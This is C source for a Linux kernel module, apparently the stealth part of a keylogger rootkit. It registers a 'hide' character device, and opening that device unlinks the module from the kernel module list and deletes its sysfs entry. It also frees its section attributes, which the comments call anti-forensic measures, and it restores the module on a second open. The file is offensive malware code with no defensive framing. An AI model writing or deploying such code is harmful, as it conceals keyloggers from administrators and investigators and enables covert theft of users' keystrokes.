#include "./headers/module.h"
int dev_open_fops_for_hide(struct inode *inode, struct file* file)
{
    static struct list_head *module_list;
    struct kobject* saved_kobj_parent;
    sysfs_remove_fir_orig = (void *)kallsyms_lookup_name("sysfs_remove_dir");
    sysfs_create_fir_orig = (void *) kallsyms_lookup_name("sysfs_create_dir_ns");
    if (!is_hide)
    {
        /*wait to get mutex*/
        while (!mutex_trylock(&module_mutex))
            cpu_relax();
        module_list = THIS_MODULE->list.prev;
        saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
        list_del_init(&THIS_MODULE->list);//remove form the modules linked list
        sysfs_remove_fir_orig(&THIS_MODULE->mkobj.kobj);//remove the specific dir (not the object from the module)
        kobject_put(saved_kobj_parent);
        kfree(THIS_MODULE->sect_attrs);/*clean informasion for anti forensic*/
        kfree(THIS_MODULE->notes_attrs);/*using kfree to clean*/
        THIS_MODULE->notes_attrs = NULL;/* and then puts, NULL to seve the setings */
        THIS_MODULE->sect_attrs = NULL;/*things such as .bss, .text .code etc*/
        is_hide = 1;

        mutex_unlock(&module_mutex);
    }
    else
    {
        while (!mutex_trylock(&module_mutex))
            cpu_relax();
        list_add(&THIS_MODULE->list, module_list);
        kobject_get(saved_kobj_parent);
        sysfs_create_fir_orig(saved_kobj_parent);
        is_hide=0;
        
        mutex_unlock(&module_mutex);

    }
    
    return 0;    
}
static struct file_operations fops_hide =
{
    .owner = THIS_MODULE,
    .open = dev_open_fops_for_hide
};
static int hide_driver_entery(void)
{
    ret = alloc_chrdev_region(&dev_num1, 0, 1, "hide");
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: failed to allocate a major number for hide");
        return ret;
    }
    major_number1 = MAJOR(dev_num1);
    mcdev1 = cdev_alloc();
    mcdev1->ops = &fops_hide;
    mcdev1->owner = THIS_MODULE;
    ret = cdev_add(mcdev1, dev_num1, 1);
    if (ret < 0)
    {
        printk(KERN_ALERT "kelogger: unable to add hide cdev to kernel");
        return -1;
    }
    sema_init(&virtual_device1.sem, 1);
    return 0;
}
static int start_hide(void)
{
    ret = hide_driver_entery();
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
        return ret;
    }
    else
    {
        printk(KERN_ALERT "Keylogger: load the device driver successfully");
    }
    return 1;
}